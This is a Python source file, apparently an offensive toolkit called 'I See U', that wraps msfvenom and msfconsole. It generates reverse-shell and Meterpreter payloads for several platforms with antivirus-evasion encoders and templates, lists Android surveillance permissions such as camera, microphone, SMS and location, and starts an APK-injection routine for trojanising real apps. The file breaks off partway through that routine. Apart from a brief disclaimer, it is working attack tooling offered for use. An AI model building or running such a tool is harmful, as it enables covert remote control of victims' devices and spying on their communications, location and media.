#!/usr/bin/env python3
"""
I See U Toolkit v1.4 - Fixed Android Payload Generation
A complete toolkit for generating surveillance and monitoring payloads with proper Android support.
DISCLAIMER: This tool is for educational and authorized security testing purposes only.
Unauthorized use of this tool for malicious purposes is illegal and unethical.
Users are responsible for obtaining proper authorization before using this tool.
"""
import os
import sys
import subprocess
import json
import logging
import argparse
import tempfile
import shutil
import zipfile
import xml.etree.ElementTree as ET
import time
import socket
import fcntl
import struct
import platform
import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from datetime import datetime

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('iseeu_toolkit.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class ISeeUToolkit:
    """Advanced surveillance payload generator with proper Android support."""
    
    def __init__(self):
        self.config_file = "iseeu_config.json"
        self.output_dir = "generated_payloads"
        self.templates_dir = "templates"
        self.android_tools_dir = "android_tools"
        
        # Create necessary directories
        Path(self.output_dir).mkdir(exist_ok=True)
        Path(self.templates_dir).mkdir(exist_ok=True)
        Path(self.android_tools_dir).mkdir(exist_ok=True)
        
        # Load or create configuration
        self.config = self.load_config()
        
        # Modern payload configurations with CORRECT Android formats
        self.payload_configs = {
            "windows": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "windows/x64/meterpreter/reverse_tcp",
                        "reverse_http": "windows/x64/meterpreter/reverse_http",
                        "reverse_https": "windows/x64/meterpreter/reverse_https"
                    },
                    "non_staged": {
                        "reverse_tcp": "windows/x64/meterpreter_reverse_tcp",
                        "reverse_http": "windows/x64/meterpreter_reverse_http",
                        "reverse_https": "windows/x64/meterpreter_reverse_https"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "windows/x64/shell/reverse_tcp",
                        "reverse_http": "windows/x64/shell/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "windows/x64/shell_reverse_tcp",
                        "reverse_http": "windows/x64/shell_reverse_http"
                    }
                },
                "fetch": {
                    "http": "cmd/windows/http/x64/meterpreter/reverse_tcp",
                    "https": "cmd/windows/https/x64/meterpreter/reverse_tcp"
                },
                "formats": ["exe", "exe-only", "dll", "service", "powershell"]
            },
            "linux": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "linux/x64/meterpreter/reverse_tcp",
                        "reverse_http": "linux/x64/meterpreter/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "linux/x64/meterpreter_reverse_tcp",
                        "reverse_http": "linux/x64/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "linux/x64/shell/reverse_tcp",
                        "reverse_http": "linux/x64/shell/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "linux/x64/shell_reverse_tcp",
                        "reverse_http": "linux/x64/shell_reverse_http"
                    }
                },
                "fetch": {
                    "http": "cmd/linux/http/x64/meterpreter/reverse_tcp",
                    "https": "cmd/linux/https/x64/meterpreter/reverse_tcp"
                },
                "formats": ["elf", "elf-so", "raw"]
            },
            "android": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "android/meterpreter/reverse_tcp",
                        "reverse_http": "android/meterpreter/reverse_http",
                        "reverse_https": "android/meterpreter/reverse_https"
                    },
                    "non_staged": {
                        "reverse_tcp": "android/meterpreter_reverse_tcp",
                        "reverse_http": "android/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "android/shell/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "android/shell_reverse_tcp"
                    }
                },
                "java": {
                    "staged": {
                        "reverse_tcp": "java/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "java/meterpreter_reverse_tcp"
                    }
                },
                # FIXED: Use valid msfvenom formats for Android
                "formats": ["apk", "raw", "elf", "elf-so"]  # Added 'apk' as a format option
            },
            "macos": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "osx/x64/meterpreter/reverse_tcp",
                        "reverse_http": "osx/x64/meterpreter/reverse_http"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/x64/meterpreter_reverse_tcp",
                        "reverse_http": "osx/x64/meterpreter_reverse_http"
                    }
                },
                "shell": {
                    "staged": {
                        "reverse_tcp": "osx/x64/shell/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/x64/shell_reverse_tcp"
                    }
                },
                "arm": {
                    "staged": {
                        "reverse_tcp": "osx/arm64/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "osx/arm64/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["macho", "raw"]
            },
            "ios": {
                "meterpreter": {
                    "staged": {
                        "reverse_tcp": "ios/arm64/meterpreter/reverse_tcp"
                    },
                    "non_staged": {
                        "reverse_tcp": "ios/arm64/meterpreter_reverse_tcp"
                    }
                },
                "formats": ["raw"]
            }
        }
        
        # Android-specific configurations
        self.android_configs = {
            "target_sdk_versions": {
                "android_10": 29,
                "android_11": 30,
                "android_12": 31,
                "android_13": 33,
                "android_14": 34,
                "android_15": 35
            },
            "permissions": {
                "basic": [
                    "android.permission.INTERNET",
                    "android.permission.ACCESS_NETWORK_STATE"
                ],
                "storage": [
                    "android.permission.READ_EXTERNAL_STORAGE",
                    "android.permission.WRITE_EXTERNAL_STORAGE"
                ],
                "location": [
                    "android.permission.ACCESS_FINE_LOCATION",
                    "android.permission.ACCESS_COARSE_LOCATION"
                ],
                "camera": [
                    "android.permission.CAMERA"
                ],
                "microphone": [
                    "android.permission.RECORD_AUDIO"
                ],
                "contacts": [
                    "android.permission.READ_CONTACTS"
                ],
                "sms": [
                    "android.permission.READ_SMS",
                    "android.permission.SEND_SMS"
                ],
                "calls": [
                    "android.permission.READ_CALL_LOG",
                    "android.permission.WRITE_CALL_LOG"
                ]
            },
            "evasion_techniques": [
                "apk_wrapper",
                "permission_obfuscation",
                "native_code_embedding",
                "reflection_loading"
            ]
        }
        
        # Encoding options
        self.encoders = [
            "x86/shikata_ga_nai",
            "x64/xor_dynamic",
            "cmd/powershell_base64",
            "generic/none"
        ]
        
        # Terminal emulators to try (in order of preference)
        self.terminal_emulators = [
            "xterm",
            "gnome-terminal",
            "konsole",
            "xfce4-terminal",
            "mate-terminal",
            "lxterminal",
            "terminator"
        ]
        
        # Template files
        self.template_files = {
            "windows": ["template.exe", "template.dll"],
            "linux": ["template.elf", "template.elf-so"],
            "android": ["template.apk"]
        }
        
        # Check for required Android tools
        self.check_android_tools()
        
    def check_android_tools(self) -> None:
        """Check if required Android tools are available."""
        self.tools_available = {
            "apktool": shutil.which("apktool") is not None,
            "keytool": shutil.which("keytool") is not None,
            "jarsigner": shutil.which("jarsigner") is not None,
            "zipalign": shutil.which("zipalign") is not None
        }
        
        missing_tools = [tool for tool, available in self.tools_available.items() if not available]
        if missing_tools:
            logger.warning(f"Missing Android tools: {', '.join(missing_tools)}")
            logger.warning("Enhanced Android payload generation may not work properly")
        else:
            logger.info("All required Android tools are available")
    
    def get_system_ip(self) -> str:
        """Automatically detect system IP address."""
        try:
            # Create a socket to determine the best IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            # Fallback method for Linux
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                return ip
            except Exception:
                # Final fallback - get all interfaces
                try:
                    for interface in [b'eth0', b'wlan0', b'wlo1', b'enp0s3']:
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            ip = socket.inet_ntoa(fcntl.ioctl(
                                s.fileno(),
                                0x8915,  # SIOCGIFADDR
                                struct.pack('256s', interface[:15])
                            )[20:24])
                            s.close()
                            if ip != '127.0.0.1':
                                return ip
                        except:
                            continue
                except:
                    pass
                return self.config.get('default_lhost', '192.168.1.100')
    
    def load_config(self) -> Dict:
        """Load configuration from file or create default."""
        try:
            if Path(self.config_file).exists():
                with open(self.config_file, 'r') as f:
                    return json.load(f)
        except (json.JSONDecodeError, IOError) as e:
            logger.warning(f"Could not load config file: {e}")
        
        # Default configuration
        return {
            "default_lhost": self.get_system_ip(),
            "default_lport": "4444",
            "default_encoder": "x86/shikata_ga_nai",
            "default_format": "exe",
            "use_template": False,
            "template_file": "",
            "iterations": 1,
            "auto_start_handler": False,
            "open_terminal_for_handler": True,
            "terminal_emulator": "auto",
            "terminal_title": "I See U Toolkit - Metasploit Handler",
            "auto_detect_ip": True,
            "payload_type_preference": "staged",
            "android_settings": {
                "target_sdk": "android_11",
                "use_wrapper": True,
                "obfuscate_permissions": True,
                "request_all_permissions": False,
                "evasion_technique": "apk_wrapper",
                "keystore_path": "mykey.keystore",
                "keystore_password": "android",
                "key_alias": "mykey",
                "key_password": "android"
            }
        }
    
    def save_config(self) -> None:
        """Save current configuration to file."""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
            logger.info("Configuration saved successfully")
        except IOError as e:
            logger.error(f"Could not save config file: {e}")
    
    def get_available_terminal(self) -> Optional[str]:
        """Find an available terminal emulator."""
        if self.config.get("terminal_emulator") != "auto":
            # Check if the specified terminal is available
            terminal = self.config.get("terminal_emulator")
            if shutil.which(terminal):
                return terminal
            else:
                logger.warning(f"Specified terminal '{terminal}' not found, falling back to auto-detection")
        
        # Auto-detect available terminals
        for terminal in self.terminal_emulators:
            if shutil.which(terminal):
                logger.info(f"Found terminal emulator: {terminal}")
                return terminal
        
        logger.error("No suitable terminal emulator found")
        return None
    
    def start_metasploit_handler_in_terminal(self, payload: str, lhost: str, lport: str) -> bool:
        """Start Metasploit handler in a new terminal window."""
        try:
            # Get the terminal command
            terminal = self.get_available_terminal()
            if not terminal:
                print(f"{Colors.RED}❌ No terminal emulator found. Starting in background instead.{Colors.END}")
                return self.start_metasploit_handler_background(payload, lhost, lport)
            
            # Build the msfconsole command
            msf_cmd = (
                f"msfconsole -x "
                f"'use exploit/multi/handler; "
                f"set PAYLOAD {payload}; "
                f"set LHOST {lhost}; "
                f"set LPORT {lport}; "
                f"exploit'"
            )
            
            # Build the terminal command based on the terminal type
            if terminal == "xterm":
                term_cmd = [
                    "xterm",
                    "-title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-bg", "black",
                    "-fg", "green",
                    "-e", msf_cmd
                ]
            elif terminal == "gnome-terminal":
                term_cmd = [
                    "gnome-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "--", "bash", "-c", f"{msf_cmd}; exec bash"
                ]
            elif terminal == "konsole":
                term_cmd = [
                    "konsole",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "-geometry", "120x40",
                    "-e", msf_cmd
                ]
            elif terminal == "xfce4-terminal":
                term_cmd = [
                    "xfce4-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-x", "bash", "-c", f"{msf_cmd}; exec bash"
                ]
            elif terminal == "mate-terminal":
                term_cmd = [
                    "mate-terminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-x", "bash", "-c", f"{msf_cmd}; exec bash"
                ]
            elif terminal == "lxterminal":
                term_cmd = [
                    "lxterminal",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-e", f"bash -c '{msf_cmd}; exec bash'"
                ]
            elif terminal == "terminator":
                term_cmd = [
                    "terminator",
                    "--title", self.config.get("terminal_title", "Metasploit Handler"),
                    "--geometry", "120x40",
                    "-e", f"bash -c '{msf_cmd}; exec bash'"
                ]
            else:
                # Fallback to generic approach
                term_cmd = [terminal, "-e", msf_cmd]
            
            logger.info(f"Starting Metasploit handler in {terminal}: {' '.join(term_cmd)}")
            
            # Start the terminal with the command
            subprocess.Popen(term_cmd)
            
            print(f"{Colors.GREEN}✅ Metasploit handler started in new {terminal} window{Colors.END}")
            print(f"   {Colors.CYAN}Title: {self.config.get('terminal_title', 'Metasploit Handler')}{Colors.END}")
            print(f"   {Colors.YELLOW}Payload: {payload}{Colors.END}")
            print(f"   {Colors.YELLOW}LHOST: {lhost}{Colors.END}")
            print(f"   {Colors.YELLOW}LPORT: {lport}{Colors.END}")
            
            # Give it a moment to start
            time.sleep(2)
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Metasploit handler in terminal: {e}")
            print(f"{Colors.RED}❌ Failed to start terminal. Starting in background instead.{Colors.END}")
            return self.start_metasploit_handler_background(payload, lhost, lport)
    
    def start_metasploit_handler_background(self, payload: str, lhost: str, lport: str) -> bool:
        """Start Metasploit handler in the background."""
        try:
            # Build the msfconsole command
            msf_cmd = (
                f"msfconsole -x "
                f"'use exploit/multi/handler; "
                f"set PAYLOAD {payload}; "
                f"set LHOST {lhost}; "
                f"set LPORT {lport}; "
                f"exploit'"
            )
            
            logger.info(f"Starting Metasploit handler in background: {msf_cmd}")
            
            # Start in background
            subprocess.Popen(
                msf_cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            print(f"{Colors.GREEN}✅ Metasploit handler started in background{Colors.END}")
            print(f"   {Colors.YELLOW}Payload: {payload}{Colors.END}")
            print(f"   {Colors.YELLOW}LHOST: {lhost}{Colors.END}")
            print(f"   {Colors.YELLOW}LPORT: {lport}{Colors.END}")
            print(f"   {Colors.CYAN}Check your processes or use 'ps aux | grep msfconsole' to verify{Colors.END}")
            
            return True
            
        except Exception as e:
            logger.error(f"Failed to start Metasploit handler in background: {e}")
            return False
    
    def start_metasploit_handler(self, payload: str, lhost: str, lport: str) -> bool:
        """Start Metasploit handler using the configured method."""
        if self.config.get("open_terminal_for_handler", True):
            return self.start_metasploit_handler_in_terminal(payload, lhost, lport)
        else:
            return self.start_metasploit_handler_background(payload, lhost, lport)
    
    def start_meterpreter_listener(self) -> None:
        """Start a meterpreter listener with interactive configuration."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}START METERPRETER LISTENER{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        
        # Get payload type
        print(f"\n{Colors.CYAN}Select payload type:{Colors.END}")
        print(f"{Colors.YELLOW}1. Windows Meterpreter{Colors.END}")
        print(f"{Colors.YELLOW}2. Linux Meterpreter{Colors.END}")
        print(f"{Colors.YELLOW}3. Android Meterpreter{Colors.END}")
        print(f"{Colors.YELLOW}4. macOS Meterpreter{Colors.END}")
        print(f"{Colors.YELLOW}5. Java Meterpreter{Colors.END}")
        
        payload_map = {
            "1": "windows/x64/meterpreter/reverse_tcp",
            "2": "linux/x64/meterpreter/reverse_tcp",
            "3": "android/meterpreter/reverse_tcp",
            "4": "osx/x64/meterpreter/reverse_tcp",
            "5": "java/meterpreter/reverse_tcp"
        }
        
        while True:
            choice = input(f"\n{Colors.WHITE}Enter your choice (1-5): {Colors.END}").strip()
            if choice in payload_map:
                payload = payload_map[choice]
                break
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get LHOST
        auto_ip = self.get_system_ip()
        lhost = input(f"{Colors.WHITE}Enter LHOST [{auto_ip}]: {Colors.END}").strip()
        if not lhost:
            lhost = auto_ip
        
        # Get LPORT
        lport = input(f"{Colors.WHITE}Enter LPORT [4444]: {Colors.END}").strip()
        if not lport:
            lport = "4444"
        
        # Validate inputs
        try:
            self.sanitize_input(lhost, "ip")
            self.sanitize_input(lport, "port")
        except ValueError as e:
            print(f"{Colors.RED}Error: {e}{Colors.END}")
            input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}Starting Meterpreter listener with:{Colors.END}")
        print(f"{Colors.YELLOW}  Payload: {payload}{Colors.END}")
        print(f"{Colors.YELLOW}  LHOST: {lhost}{Colors.END}")
        print(f"{Colors.YELLOW}  LPORT: {lport}{Colors.END}")
        
        # Start the handler
        self.start_metasploit_handler(payload, lhost, lport)
    
    def configure_terminal_settings(self) -> None:
        """Configure terminal emulator settings."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}TERMINAL EMULATOR SETTINGS{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        
        # Current settings
        print(f"{Colors.CYAN}Current terminal emulator: {self.config.get('terminal_emulator', 'auto')}{Colors.END}")
        print(f"{Colors.CYAN}Open terminal for handler: {self.config.get('open_terminal_for_handler', True)}{Colors.END}")
        print(f"{Colors.CYAN}Terminal title: {self.config.get('terminal_title', 'I See U Toolkit - Metasploit Handler')}{Colors.END}")
        print(f"{Colors.CYAN}Auto-detect IP: {self.config.get('auto_detect_ip', True)}{Colors.END}")
        
        # Check available terminals
        available_terminals = []
        for terminal in self.terminal_emulators:
            if shutil.which(terminal):
                available_terminals.append(terminal)
        
        if available_terminals:
            print(f"\n{Colors.GREEN}Available terminal emulators: {', '.join(available_terminals)}{Colors.END}")
        else:
            print(f"\n{Colors.RED}No terminal emulators found!{Colors.END}")
        
        # Configure settings
        print(f"\n{Colors.CYAN}Configure terminal emulator settings:{Colors.END}")
        
        # Terminal emulator selection
        print(f"{Colors.YELLOW}1. Auto-detect terminal emulator{Colors.END}")
        for i, terminal in enumerate(self.terminal_emulators, 2):
            status = f"{Colors.GREEN}✓{Colors.END}" if terminal in available_terminals else f"{Colors.RED}✗{Colors.END}"
            print(f"{Colors.YELLOW}{i}. {terminal} {status}{Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Select terminal emulator (1-7): {Colors.END}").strip()
            if choice == "1":
                self.config["terminal_emulator"] = "auto"
                break
            else:
                try:
                    term_index = int(choice) - 2
                    if 0 <= term_index < len(self.terminal_emulators):
                        selected_terminal = self.terminal_emulators[term_index]
                        if selected_terminal in available_terminals:
                            self.config["terminal_emulator"] = selected_terminal
                            break
                        else:
                            print(f"{Colors.RED}❌ {selected_terminal} is not available{Colors.END}")
                    else:
                        print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
                except ValueError:
                    print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Open terminal for handler
        open_terminal = input(f"{Colors.WHITE}Open terminal for handler? (Y/n): {Colors.END}").strip().lower()
        self.config["open_terminal_for_handler"] = open_terminal != "n"
        
        # Terminal title
        title = input(f"{Colors.WHITE}Terminal title [{self.config.get('terminal_title', 'I See U Toolkit - Metasploit Handler')}]: {Colors.END}").strip()
        if title:
            self.config["terminal_title"] = title
        
        # Auto-detect IP
        auto_ip = input(f"{Colors.WHITE}Auto-detect system IP? (Y/n): {Colors.END}").strip().lower()
        self.config["auto_detect_ip"] = auto_ip != "n"
        
        # Save configuration
        self.save_config()
        print(f"\n{Colors.GREEN}✅ Terminal settings saved successfully!{Colors.END}")
    
    def generate_traditional_payload(self) -> None:
        """Generate a traditional payload with full functionality."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}TRADITIONAL PAYLOAD GENERATION{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        
        # Get platform choice
        platforms = {
            "1": "windows",
            "2": "linux", 
            "3": "android",
            "4": "macos",
            "5": "ios"
        }
        
        print(f"\n{Colors.CYAN}Select target platform:{Colors.END}")
        print(f"{Colors.YELLOW}1. Windows{Colors.END}")
        print(f"{Colors.YELLOW}2. Linux{Colors.END}")
        print(f"{Colors.YELLOW}3. Android{Colors.END}")
        print(f"{Colors.YELLOW}4. macOS{Colors.END}")
        print(f"{Colors.YELLOW}5. iOS{Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice (1-5): {Colors.END}").strip()
            if choice in platforms:
                platform = platforms[choice]
                break
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get payload type
        configs = self.payload_configs[platform]
        
        print(f"\n{Colors.CYAN}Select payload type for {platform}:{Colors.END}")
        print(f"{Colors.YELLOW}1. Meterpreter (recommended){Colors.END}")
        print(f"{Colors.YELLOW}2. Shell{Colors.END}")
        
        if "fetch" in configs:
            print(f"{Colors.YELLOW}3. Fetch Payload{Colors.END}")
        
        payload_types = ["meterpreter", "shell"]
        if "fetch" in configs:
            payload_types.append("fetch")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
            try:
                type_index = int(choice) - 1
                if 0 <= type_index < len(payload_types):
                    payload_type = payload_types[type_index]
                    break
            except ValueError:
                pass
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get staged vs non-staged (except for fetch payloads)
        if payload_type != "fetch":
            print(f"\n{Colors.CYAN}Select payload type:{Colors.END}")
            print(f"{Colors.YELLOW}1. Staged (smaller initial payload){Colors.END}")
            print(f"{Colors.YELLOW}2. Non-staged (single larger payload){Colors.END}")
            
            while True:
                choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
                if choice == "1":
                    payload_stage = "staged"
                    break
                elif choice == "2":
                    payload_stage = "non_staged"
                    break
                else:
                    print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        else:
            payload_stage = "staged"
        
        # Get connection method
        if payload_type != "fetch":
            print(f"\n{Colors.CYAN}Select connection method for {payload_type}:{Colors.END}")
            methods = list(configs[payload_type][payload_stage].keys())
            for i, method in enumerate(methods, 1):
                print(f"{Colors.YELLOW}{i}. {method}{Colors.END}")
            
            while True:
                choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
                try:
                    method_index = int(choice) - 1
                    if 0 <= method_index < len(methods):
                        method = methods[method_index]
                        break
                except ValueError:
                    pass
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        else:
            # Get fetch protocol
            print(f"\n{Colors.CYAN}Select fetch protocol:{Colors.END}")
            protocols = list(configs["fetch"].keys())
            for i, protocol in enumerate(protocols, 1):
                print(f"{Colors.YELLOW}{i}. {protocol.upper()}{Colors.END}")
            
            while True:
                choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
                try:
                    protocol_index = int(choice) - 1
                    if 0 <= protocol_index < len(protocols):
                        protocol = protocols[protocol_index]
                        method = protocol
                        break
                except ValueError:
                    pass
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get output format
        print(f"\n{Colors.CYAN}Select output format:{Colors.END}")
        formats = configs["formats"]
        for i, fmt in enumerate(formats, 1):
            print(f"{Colors.YELLOW}{i}. {fmt}{Colors.END}")
        
        while True:
            choice = input(f"{Colors.WHITE}Enter your choice: {Colors.END}").strip()
            try:
                format_index = int(choice) - 1
                if 0 <= format_index < len(formats):
                    output_format = formats[format_index]
                    break
            except ValueError:
                pass
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Get user inputs
        user_inputs = {}
        
        # Get LHOST with auto-detection
        auto_ip = self.get_system_ip() if self.config.get('auto_detect_ip', True) else self.config.get('default_lhost', '192.168.1.100')
        while True:
            lhost = input(f"{Colors.WHITE}Enter LHOST [{auto_ip}]: {Colors.END}").strip()
            if not lhost:
                lhost = auto_ip
            try:
                user_inputs['lhost'] = self.sanitize_input(lhost, "ip")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get LPORT with validation
        while True:
            lport = input(f"{Colors.WHITE}Enter LPORT [{self.config['default_lport']}]: {Colors.END}").strip()
            if not lport:
                lport = self.config['default_lport']
            try:
                user_inputs['lport'] = self.sanitize_input(lport, "port")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get payload name with validation
        while True:
            payload_name = input(f"{Colors.WHITE}Enter payload name: {Colors.END}").strip()
            if payload_name:
                try:
                    user_inputs['payload_name'] = self.sanitize_input(payload_name, "filename")
                    break
                except ValueError as e:
                    print(f"{Colors.RED}Error: {e}{Colors.END}")
            else:
                print(f"{Colors.RED}Payload name cannot be empty.{Colors.END}")
        
        # Get encoding options
        encoding_options = {}
        
        # Ask about encoding
        use_encoding = input(f"{Colors.WHITE}Use encoding? (y/N): {Colors.END}").strip().lower()
        if use_encoding == 'y':
            print(f"\n{Colors.CYAN}Available encoders:{Colors.END}")
            for i, encoder in enumerate(self.encoders, 1):
                print(f"{Colors.YELLOW}{i}. {encoder}{Colors.END}")
            
            while True:
                choice = input(f"{Colors.WHITE}Select encoder (1-4): {Colors.END}").strip()
                try:
                    encoder_index = int(choice) - 1
                    if 0 <= encoder_index < len(self.encoders):
                        encoding_options['encoder'] = self.encoders[encoder_index]
                        break
                except ValueError:
                    pass
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
            
            # Get iterations
            while True:
                iterations = input(f"{Colors.WHITE}Enter encoding iterations (1-5): {Colors.END}").strip()
                try:
                    iterations = int(iterations)
                    if 1 <= iterations <= 5:
                        encoding_options['iterations'] = iterations
                        break
                except ValueError:
                    pass
                print(f"{Colors.RED}Iterations must be between 1 and 5.{Colors.END}")
        
        # Ask about template usage
        use_template = input(f"{Colors.WHITE}Use custom template for evasion? (y/N): {Colors.END}").strip().lower()
        if use_template == 'y':
            # List available templates
            print(f"\n{Colors.CYAN}Available templates:{Colors.END}")
            templates = []
            for platform, files in self.template_files.items():
                for template in files:
                    templates.append(f"{platform}/{template}")
            
            for i, template in enumerate(templates, 1):
                print(f"{Colors.YELLOW}{i}. {template}{Colors.END}")
            
            while True:
                choice = input(f"{Colors.WHITE}Select template: {Colors.END}").strip()
                try:
                    template_index = int(choice) - 1
                    if 0 <= template_index < len(templates):
                        encoding_options['template'] = templates[template_index]
                        break
                except ValueError:
                    pass
                print(f"{Colors.RED}Invalid choice. Please try again.{Colors.END}")
        
        # Build the msfvenom command
        if payload_type == "fetch":
            payload = configs["fetch"][method]
        else:
            payload = configs[payload_type][payload_stage][method]
        
        # Start building the command
        cmd_parts = ["msfvenom", "-p", payload]
        
        # Add LHOST and LPORT
        cmd_parts.extend([f"LHOST={user_inputs['lhost']}", f"LPORT={user_inputs['lport']}"])
        
        # Add encoding options
        if 'encoder' in encoding_options:
            cmd_parts.extend(["-e", encoding_options['encoder']])
            if 'iterations' in encoding_options:
                cmd_parts.extend(["-i", str(encoding_options['iterations'])])
        
        # Add template if specified
        if 'template' in encoding_options:
            cmd_parts.extend(["-x", encoding_options['template']])
        
        # FIXED: For Android platform, always use raw format with .apk extension
        if platform == "android":
            # Always use raw format for Android
            cmd_parts.extend(["-f", "raw"])
            # Always use .apk extension for Android
            output_file = f"{self.output_dir}/{user_inputs['payload_name']}.apk"
            print(f"\n{Colors.CYAN}Note: For Android payloads, using raw format with .apk extension{Colors.END}")
        else:
            # For non-Android platforms, use the selected format
            cmd_parts.extend(["-f", output_format])
            output_file = f"{self.output_dir}/{user_inputs['payload_name']}.{output_format}"
        
        # Add output file
        cmd_parts.extend(["-o", output_file])
        
        command = " ".join(cmd_parts)
        print(f"\n{Colors.CYAN}Generated command: {Colors.END}{Colors.YELLOW}{command}{Colors.END}")
        
        # Open xterm to show the command execution
        terminal = self.get_available_terminal()
        if terminal and terminal == "xterm":
            xterm_cmd = [
                "xterm",
                "-title", "Payload Generation",
                "-geometry", "120x40",
                "-bg", "black",
                "-fg", "green",
                "-e", f"bash -c '{command}; echo \"Press Enter to close...\"; read'"
            ]
            subprocess.Popen(xterm_cmd)
            print(f"{Colors.GREEN}✅ Opening xterm to show payload generation{Colors.END}")
        
        # Execute the command
        if self.execute_command(command):
            print(f"\n{Colors.GREEN}✅ Payload generated successfully: {output_file}{Colors.END}")
            
            # Ask if user wants to start handler
            start_handler = input(f"{Colors.WHITE}Start Metasploit handler? (Y/n): {Colors.END}").strip().lower()
            if start_handler != "n":
                self.start_metasploit_handler(payload, user_inputs['lhost'], user_inputs['lport'])
        else:
            print(f"\n{Colors.RED}❌ Failed to generate payload{Colors.END}")
    
    def generate_injected_android_payload(self) -> None:
        """Generate an Android payload by injecting it into an original APK."""
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}INJECT PAYLOAD INTO ORIGINAL APK{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*50}{Colors.END}")
        
        # Check if required tools are available
        missing_tools = [tool for tool, available in self.tools_available.items() if not available]
        if missing_tools:
            print(f"{Colors.RED}❌ Missing required tools: {', '.join(missing_tools)}{Colors.END}")
            print(f"{Colors.YELLOW}Please install the missing tools to use this feature.{Colors.END}")
            input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.END}")
            return
        
        # Get user inputs
        user_inputs = {}
        
        # Get LHOST with auto-detection
        auto_ip = self.get_system_ip() if self.config.get('auto_detect_ip', True) else self.config.get('default_lhost', '192.168.1.100')
        while True:
            lhost = input(f"{Colors.WHITE}Enter LHOST [{auto_ip}]: {Colors.END}").strip()
            if not lhost:
                lhost = auto_ip
            try:
                user_inputs['lhost'] = self.sanitize_input(lhost, "ip")
                break
            except ValueError as e:
                print(f"{Colors.RED}Error: {e}{Colors.END}")
        
        # Get LPORT with validation
        while True:
